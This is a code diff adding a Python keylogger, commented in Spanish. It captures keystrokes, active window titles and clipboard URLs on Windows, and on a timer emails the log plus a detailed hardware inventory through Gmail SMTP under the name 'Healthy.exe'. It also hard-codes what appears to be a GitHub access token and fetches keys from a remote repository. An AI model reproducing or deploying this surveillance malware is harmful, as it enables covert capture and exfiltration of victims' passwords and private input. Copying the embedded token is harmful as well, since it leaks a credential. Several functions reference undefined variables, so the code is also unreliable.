@@ -1,0 +1,453 @@
+import json
+import time
+import smtplib
+from email.mime.text import MIMEText
+from pynput import keyboard
+import pyperclip
+import socket
+import logging
+import win32gui, threading
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.application import MIMEApplication
+import os
+import sys
+import psutil
+import platform, serial
+import serial.tools.list_ports
+import GPUtil
+from cryptography.fernet import Fernet
+import requests
+# Función para obtener la dirección IP local
+def get_local_ip(config_filename='config.json'):
+    try:
+        with open(config_filename, 'r') as file:
+            config = json.load(file)
+            keylogger_IP = config.get('keylogger_IP', False)
+            if keylogger_IP:
+                hostname = socket.gethostname()
+                local_ip = socket.gethostbyname(hostname)
+                return local_ip
+            else:
+                return "Disabled"
+    except:
+        return "Unknown"
+
+# Función para interpretar la URL (debe implementarse según necesidad)
+def parse_url(url):
+    # Aquí puedes implementar la lógica para interpretar la URL
+    return url
+
+# Función para guardar la visita a una URL en el registro
+def log_website_visit(url, config_filename='config.json'):
+    try:
+        with open(config_filename, 'r') as file:
+            config = json.load(file)
+            keylogger_web_visit = config.get('keylogger_web_visit', False)
+            if keylogger_web_visit:
+                time_now = time.strftime("%Y-%m-%d %H:%M:%S")
+                log_data = f'{time_now} - Visited URL: {url}'
+                print(log_data)
+
+                carpeta_guardado = config.get("carpeta_guardado", 'KeyActiveLog.txt')
+                logging.basicConfig(filename=carpeta_guardado, level=logging.DEBUG, format='%(message)s')
+                logging.log(10, log_data)
+            else:
+                print("Disabled")
+    except:
+        print("Error while logging website visit")
+
+# Función para obtener el título de la ventana activa
+def get_active_window(config_filename="config.json"):
+    try:
+        with open(config_filename, 'r') as file:
+            config = json.load(file)
+            Keylogger_active_windows = config.get('Keylogger_active_windows', False)
+            if Keylogger_active_windows:
+                window = win32gui.GetForegroundWindow()
+                window_title = win32gui.GetWindowText(window)
+                return window_title
+            else:
+                return "Disable"
+    except:
+        return "Unknown"
+
+# Función que se ejecuta cada vez que se presiona una tecla
+def on_keypress(key, carpeta_guardado):
+    global log_data, last_activity_time
+    last_activity_time = time.time()  # Actualizamos last_activity_time al presionar una tecla
+    # print(f"Last activity time updated: {last_activity_time}")
+
+    try:
+        window_title = get_active_window()
+        time_now = time.strftime("%Y-%m-%d %H:%M:%S")
+
+        clipboard_content = pyperclip.paste()
+
+        local_ip = get_local_ip()
+
+        if clipboard_content.startswith('http://') or clipboard_content.startswith('https://'):
+            interpreted_url = parse_url(clipboard_content)
+            log_website_visit(interpreted_url)
+            log_data = f'{time_now} - Window: {window_title}, URL: {interpreted_url}, IP: {local_ip}'
+            print(f'{time_now} - Window: {window_title}, URL: {interpreted_url}, IP: {local_ip}')
+        elif 'http://' in window_title or 'https://' in window_title:
+            log_website_visit(window_title)
+            log_data = f'{time_now} - Window: {window_title}, IP: {local_ip}'
+            print(f'{time_now} - Window: {window_title}, IP: {local_ip}')
+        else:
+            key_str = str(key.char) if hasattr(key, 'char') else str(key)
+            log_data = f'{time_now} - Window: {window_title}, Key: {key_str}, IP: {local_ip}'
+            print(f'{time_now} - Window: {window_title}, Key: {key_str}, IP: {local_ip}')
+
+        logging.basicConfig(filename=carpeta_guardado, level=logging.DEBUG, format='%(message)s')
+        logging.log(10, log_data)
+
+    except AttributeError:
+        print(f'{time_now} - Window: {window_title}, Special Key: {key}')
+
+# Función para enviar correo electrónico con archivo adjunto
+def send_email(subject, message, recipient_email, config, attachment_path):
+    sender_email = config["fromaddr"]
+    sender_password = config["password"]
+
+    msg = MIMEMultipart()
+    msg["Subject"] = subject
+    msg["From"] = sender_email
+    msg["To"] = recipient_email
+    msg.attach(MIMEText(message, 'plain'))
+
+    with open(attachment_path, 'rb') as attachment:
+        part = MIMEApplication(attachment.read(), Name=os.path.basename(attachment_path))
+        part['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment_path)}"'
+        msg.attach(part)
+
+      # Obtener información del sistema
+    system_info = ""  # Definir la variable aquí
+
+    # Obtener información del sistema
+    if config.get("show_PC_name", False):
+        system_info += f"Nombre del PC: {socket.gethostname()}\n"
+
+    if config.get("show_System_Operative", False):
+        system_info += f"Sistema operativo: {platform.system()} {platform.release()}\n"
+
+    if config.get("show_Processor", False):
+        system_info += f"Procesador: {platform.processor()}\n"
+
+    if config.get("show_RAM_Memory", False):
+        system_info += f"Memoria RAM total: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB\n"
+
+    if config.get("show_RAM_Pecent", False):
+        system_info += f"Uso de Memoria RAM: {psutil.virtual_memory().percent}%\n"
+
+    if config.get("show_GPU", False):
+        system_info += f"CPU: {psutil.cpu_percent(interval=1)}% de uso\n"
+
+    # Obtener la información de la CPU
+
+    gpus = []  # Inicializar la variable gpus
+    try:
+        if config.get("show_GPU", False):
+            gpus = GPUtil.getGPUs()
+        for gpu in gpus:
+            system_info += f"GPU: {gpu.name}\n"
+            system_info += f"  Memoria total: {gpu.memoryTotal} MB\n"
+            system_info += f"  Uso de GPU: {gpu.memoryUtil * 100:.2f}%\n"
+
+    except Exception as e:
+        print("Error al obtener información de la GPU:", str(e))
+
+    # Obtener la información del Disco
+    disk_info = ""
+    if config.get("show_Disk_Storage", False):
+        for disk in psutil.disk_partitions():
+            try:
+                usage = psutil.disk_usage(disk.mountpoint)
+                disk_info += f"Disco {disk.device}\n"
+                disk_info += f"  Espacio total: {usage.total / (1024 ** 3):.2f} GB\n"
+                disk_info += f"  Espacio usado: {usage.used / (1024 ** 3):.2f} GB\n"
+                disk_info += f"  Espacio libre: {usage.free / (1024 ** 3):.2f} GB\n"
+                disk_info += f"  Uso de espacio: {usage.percent}%\n"
+            except psutil.AccessDenied:
+                disk_info += f"Disco {disk.device}\n"
+                disk_info += f"  Espacio total: No disponible (permisos insuficientes)\n"
+                disk_info += f"  Espacio usado: No disponible (permisos insuficientes)\n"
+                disk_info += f"  Espacio libre: No disponible (permisos insuficientes)\n"
+                disk_info += f"  Uso de espacio: No disponible (permisos insuficientes)\n"
+# Agregar la información de los discos al sistema_info una vez se hayan recopilado todos los discos
+    system_info += disk_info
+
+    # system_info += f"Módem: (Obtener información del módem aquí)\n"  # Agregar información del módem
+
+    #Obtener la información de la cantidad de discos del sistema
+    try:
+        disk_count = len(psutil.disk_partitions())
+        if config.get("show_Disk_Quantity", False):
+            system_info += f"Número de discos: {disk_count}\n"
+    except Exception as e:
+            print("Error al obtener información de los discos:", str(e))
+
+    #Obtener la información de la temperatura de la GPU
+    try:  
+        if config.get("show_GPU_Temperature", False) and gpu_info:
+            gpu_info = psutil.sensors_temperatures().get('coretemp', [])
+            gpu_temp = gpu_info[0].current
+            system_info += f"GPU: Temperatura: {gpu_temp}°C\n"
+        else:
+            system_info += "GPU: No se encontró información de temperatura\n"
+    except Exception as e:
+        system_info += "GPU: Error al obtener información de temperatura\n"
+
+
+    # Información de la placa madre
+    try:
+        motherboard_info = platform.uname()
+        if config.get("show_Motherboard_info", False):        
+            system_info += f"Placa madre: {motherboard_info.board}\n"
+    except Exception as e:
+        system_info += "Placa madre: Error al obtener información\n"
+
+    # Información de la RAMA
+    try:
+        if config.get("show_RAM_Complete_Storage", False):
+            ram_info = psutil.virtual_memory()
+        system_info += f"RAM: {ram_info.total / (1024 ** 3):.2f} GB, {ram_info.available / (1024 ** 3):.2f} GB disponible\n"
+        for module in ram_info.list:
+            system_info += f"Módulo: {module.label}, Frecuencia: {module.frequency / (1024 ** 2):.2f} MHz\n"
+    except:
+        system_info += "RAM: Error al obtener información\n"
+
+
+    # Obtener información de cada módulo de RAM
+    try:
+        if config.get("show_RAM_Modules", False):
+            ram_modules = psutil.virtual_memory().list
+            system_info += f"Cantidad de módulos de RAM: {len(ram_modules)}\n"
+        for module in ram_modules:
+            system_info += f"  Nombre: {module.label}, Frecuencia: {module.frequency / (1024 ** 2):.2f} MHz\n"
+    except Exception as e:
+        system_info += "Módulos de RAM: Error al obtener información\n"
+
+      # Información del módem (puertos serie disponibles)
+    try:
+        if config.get("show_modem", False):
+            modem_ports = serial.tools.list_ports.comports()
+        if modem_ports:
+            system_info += "Módem:\n"
+            for port in modem_ports:
+                system_info += f"  Puerto: {port.device}, Descripción: {port.description}\n"
+        else:
+            system_info += "Módem: No se encontraron puertos serie\n"
+    except Exception as e:
+        system_info += "Módem: Error al obtener información\n"
+
+    msg.attach(MIMEText(system_info, 'plain'))
+
+    # Verificar si email_active y clean_key_active_log_enabled están habilitados
+    if email_active:
+        try:
+            # Copiar contenido a KeyInactiveLog.txt
+            copy_to_inactive_log(carpeta_guardado, carpeta_inactiva)
+            
+            # Verificar si la carpeta no está vacía antes de enviar el correo
+            if os.path.getsize(carpeta_guardado) > 0:
+                # Enviar correo electrónico
+                server = smtplib.SMTP('smtp.gmail.com', 587)
+                server.starttls()
+                server.login(sender_email, sender_password)
+                server.sendmail(sender_email, recipient_email, msg.as_string())
+                server.quit()
+                print("Correo electrónico con información del sistema enviado exitosamente")
+
+                # Verificar si está habilitada la limpieza de KeyActiveLog
+                if clean_key_active_log_enabled:
+                    # Verificar si KeyActiveLog no está vacío antes de limpiarlo
+                    if os.path.getsize(carpeta_guardado) > 0:
+                        clean_key_active_log(carpeta_guardado)
+                        print("Archivo KeyActiveLog limpiado")
+                    else:
+                        print("KeyActiveLog está vacío, no se realizó la limpieza")
+            else:
+                print("KeyActiveLog está vacío, no se envió el correo ni se realizó la limpieza")
+        except Exception as e:
+            print("Error al enviar el correo electrónico:", str(e))
+    else:
+        print("Envío de correos electrónicos deshabilitado en la configuración")
+
+
+# Función para verificar el tiempo de inactividad y enviar el correo
+def check_and_send_email(config):
+    global last_activity_time
+    send_email_interval_minutes = config.get("send_email_interval", 1)  # Obtener el valor de "send_email" del config.json
+
+    while True:
+        current_time = time.time()
+        inactive_duration = current_time - last_activity_time
+
+        if inactive_duration >= send_email_interval_minutes * 60:  # Convertir minutos a segundos
+            with open(carpeta_guardado, "r") as log_file:
+                log_content = log_file.read()
+            send_email("Registro del Healthy.exe", "Adjunto el registro del Healthy.exe.\n", config["toaddr"], config, carpeta_guardado)
+            last_activity_time = current_time  # Reiniciamos last_activity_time
+
+        time.sleep(30)  # Verificar cada 30 segundos
+        
+# Función para limpiar el archivo KeyActiveLog
+def clean_key_active_log(file_path):
+    try:
+        with open(file_path, 'w') as file:
+            file.truncate(0)  # Borra todo el contenido del archivo
+    except Exception as e:
+        print("Error al limpiar el archivo KeyActiveLog:", str(e))
+
+
+# Función para verificar y crear el archivo KeyInactiveLog.txt si no existe
+def create_inactive_log_file(inactive_log_file):
+    try:
+        # Intentar abrir el archivo en modo de escritura
+        with open(inactive_log_file, "w") as file:
+            pass  # No hace nada, solo verifica si el archivo se puede abrir
+        return True
+    except Exception as e:
+        print("Error al crear el archivo KeyInactiveLog.txt:", str(e))
+        return False
+ 
+# Función para copiar el contenido de KeyActiveLog.txt a KeyInactiveLog.txt
+def copy_to_inactive_log(active_log_file, inactive_log_file):
+    try:
+        # Abrir el archivo KeyActiveLog.txt en modo lectura
+        with open(active_log_file, "r") as active_file:
+            active_content = active_file.read()  # Leer el contenido del archivo
+        # Verificar si el contenido no está vacío antes de copiar
+        if active_content:
+            # Abrir el archivo KeyInactiveLog.txt en modo escritura
+            with open(inactive_log_file, "a") as inactive_file:
+                inactive_file.write(active_content)  # Escribir el contenido en el archivo inactivo
+            print("Contenido de KeyActiveLog.txt copiado a KeyInactiveLog.txt")
+        else:
+            print("El archivo KeyActiveLog.txt está vacío, no se realizó la copia")
+    except Exception as e:
+        print("Error al copiar el contenido de KeyActiveLog.txt a KeyInactiveLog.txt:", str(e))
+
+
+def create_inactive_log_file_if_not_exists(inactive_log_file):
+    try:
+        if not os.path.exists(inactive_log_file):
+            with open(inactive_log_file, "w") as file:
+                print("Archivo KeyInactiveLog.txt creado exitosamente")
+        else:
+            print("El archivo KeyInactiveLog.txt ya existe")
+    except Exception as e:
+        print("Error al crear el archivo KeyInactiveLog.txt:", str(e))
+
+
+# Función para cargar la clave de desencriptación desde GitHub
+def load_decryption_key_from_github(key_url, github_token):
+    headers = {"Authorization": f"token {github_token}"}
+    try:
+        response = requests.get(key_url, headers=headers)
+        response.raise_for_status()  # Lanzará una excepción si la respuesta no es exitosa (código de estado diferente a 200)
+        key_data = response.json()
+        decryption_keys = key_data.get("keys", [])  # Debería ser "keys" en lugar de "KeyDESENCYPT"
+        return decryption_keys
+    except requests.exceptions.RequestException as e:
+        print("Error al hacer la petición al Servidor Externo:", e)
+        return []
+    except json.JSONDecodeError as e:
+        print("Error al decodificar la respuesta JSON:", e)
+        return []
+
+if __name__ == "__main__":
+    # Función para cargar la configuración desde un archivo JSON
+    def load_config(filename):
+        try:
+            with open(filename, 'r') as file:
+                return json.load(file)
+        except FileNotFoundError:
+            with open('config_default.json', 'r') as default_file:
+                return json.load(default_file)
+    
+     # Nombre del archivo de configuración
+    config_filename = 'config.json'
+
+    # Cargar la configuración
+    config = load_config(config_filename)
+
+    # Obtener el valor de 'Encrypt_Code' y 'KeyDESENCYPT' del archivo de configuración
+    github_access_token = "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"
+    decryption_key_url = "https://raw.githubusercontent.com/S-A-L-M/Key-H.exe/main/KeysH-exe.json"
+    
+    encrypt_code_enabled = config.get("Descrypt_Code", False)
+    
+    if encrypt_code_enabled:
+        decryption_keys = load_decryption_key_from_github(decryption_key_url, github_access_token)
+
+        if decryption_keys:
+            # Verificar si la clave de desencriptación en config.json coincide con al menos una clave en GitHub
+            if config["KeyDESENCYPT"] in decryption_keys:
+                # Resto del código para desencriptar y procesar el contenido
+                print("Contenido desencriptado y guardado")
+            else:
+                print("La clave de desencriptación en config.json no coincide con ninguna clave en GitHub")
+        else:
+            print("No se pudo obtener la clave de desencriptación desde GitHub")
+    else:
+        print("La encriptación no está habilitada en la configuración")
+    
+    # Nombre del archivo de configuración
+    config_filename = 'config.json'
+
+    # Cargar la configuración
+    config = load_config(config_filename)
+    
+    
+
+
+    # Guardar la configuración inicial si el archivo no existe
+    with open(config_filename, 'w') as file:
+        json.dump(config, file, indent=4)
+
+    # Variables para el tiempo de inactividad y el registro de actividad
+    last_activity_time = time.time()
+    log_data = ""
+    
+    
+    # Ruta del archivo donde se guardarán los registros del Keylogger
+    carpeta_guardado = config.get("carpeta_guardado", 'KeyActiveLog.txt')
+    carpeta_inactiva = "KeyInactiveLog.txt"
+    create_inactive_log_file_if_not_exists(carpeta_inactiva)
+    keylogger_active = config.get('keylogger_active', False)
+    email_active = config.get('active_Email', False)
+    clean_key_active_log_enabled = config.get('clean_KeyActiveLog', False)
+
+
+    
+     # Crear y ejecutar el hilo para verificar el tiempo de inactividad y enviar correo
+    email_thread = threading.Thread(target=check_and_send_email, args=(config,))
+    email_thread.start()
+
+
+    # Definir la función on_keyrelease dentro del bloque if __name__ == "__main__":
+    def on_keyrelease(key):
+        if key == keyboard.Key.esc:
+            return False
+    
+    
+
+# Verificar si keylogger_active está activado en el config.json
+    if keylogger_active:
+        with keyboard.Listener(
+            on_press=lambda key: on_keypress(key, carpeta_guardado),
+            on_release=on_keyrelease,
+        ) as listener:
+            while True:
+                listener.join()  # Esperar por eventos de teclado
+                check_and_send_email(config)  # Verificar el tiempo de inactividad y enviar correo si es necesario
+    else:
+        print("Esta desactivada el programa del keylogger en el archivo 'config.json'")
+        os._exit(0)  # Salir del programa de manera abrupta
+
+
+
+
